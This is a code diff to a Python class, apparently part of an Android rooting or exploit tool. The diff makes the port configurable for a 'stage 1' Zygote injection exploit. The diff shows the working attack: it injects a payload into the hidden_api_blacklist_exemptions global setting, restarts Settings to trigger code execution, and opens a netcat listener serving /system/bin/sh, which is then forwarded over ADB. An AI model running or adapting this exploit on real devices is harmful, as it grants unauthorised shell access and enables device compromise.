@@ -30,10 +30,12 @@ PropValue = Union[str, int, float, bool]
 class Stage1Exploit:
     def __init__(
         self,
+        port: int = 4321,
         device_serial: Optional[str] = None,
         auto_connect: bool = True,
         adb_client: Optional[AdbClient] = None,
     ) -> None:
+        self.port = port
         if adb_client is None:
             self._adb_client = AdbClient()
         else:
@@ -228,10 +230,10 @@ class Stage1Exploit:
                     return True
         return False
 
-    def exploit_stage1(self) -> bool:
-        if self.is_port_open(1234):
+    def exploit_stage1(self) -> int:
+        if self.is_port_open(self.port):
             print("The exploit is already running!")
-            self.device.forward("tcp:1234", "tcp:1234")
+            self.device.forward(f"tcp:{self.port}", f"tcp:{self.port}")
             return True
 
         # make sure the hidden_api_blacklist_exemptions variable is reset
@@ -256,38 +258,38 @@ class Stage1Exploit:
             return True
         else:
             command = f"(settings delete global hidden_api_blacklist_exemptions;{parsed_netcat_command} -s 127.0.0.1 -p {self.port} -L /system/bin/sh)&"
-        exploit_value = self.generate_stage1_exploit(command, exploit_type)
-        exploit_command = [
-            "settings",
-            "put",
-            "global",
-            "hidden_api_blacklist_exemptions",
-            exploit_value,
-        ]
+            exploit_value = self.generate_stage1_exploit(command, exploit_type)
+            exploit_command = [
+                "settings",
+                "put",
+                "global",
+                "hidden_api_blacklist_exemptions",
+                exploit_value,
+            ]
 
-        # run the exploit!
-        self.shell_execute(["am", "force-stop", "com.android.settings"])
-        self.shell_execute(exploit_command)
-        time.sleep(0.25)
-        self.shell_execute(["am", "start", "-a", "android.settings.SETTINGS"])
-        print("Zygote injection complete, waiting for code to execute...")
+            # run the exploit!
+            self.shell_execute(["am", "force-stop", "com.android.settings"])
+            self.shell_execute(exploit_command)
+            time.sleep(0.25)
+            self.shell_execute(["am", "start", "-a", "android.settings.SETTINGS"])
+            print("Zygote injection complete, waiting for code to execute...")
 
-        for current_try in range(20):
-            # if the setting was deleted, this indicates the exploit succeeded
-            setting_value = self.get_setting(
-                "global", "hidden_api_blacklist_exemptions"
-            )
-            if setting_value == "null":
-                if self.is_port_open(1234):
-                    self.device.forward("tcp:1234", "tcp:1234")
-                    print("Stage 1 success!")
-                    return True
-                else:
-                    raise ZygoteInjectionException(
-                        "setting was deleted but no listener was found"
-                    )
-            time.sleep(0.5)
-        print("Stage 1 failed, reboot and try again")
+            for current_try in range(20):
+                # if the setting was deleted, this indicates the exploit succeeded
+                setting_value = self.get_setting(
+                    "global", "hidden_api_blacklist_exemptions"
+                )
+                if setting_value == "null":
+                    if self.is_port_open(self.port):
+                        self.device.forward(f"tcp:{self.port}", f"tcp:{self.port}")
+                        print("Stage 1 success!")
+                        return True
+                    else:
+                        raise ZygoteInjectionException(
+                            "setting was deleted but no listener was found"
+                        )
+                time.sleep(0.5)
+            print("Stage 1 failed, reboot and try again")
 
         # exploit failed, clean up
         self.shell_execute(
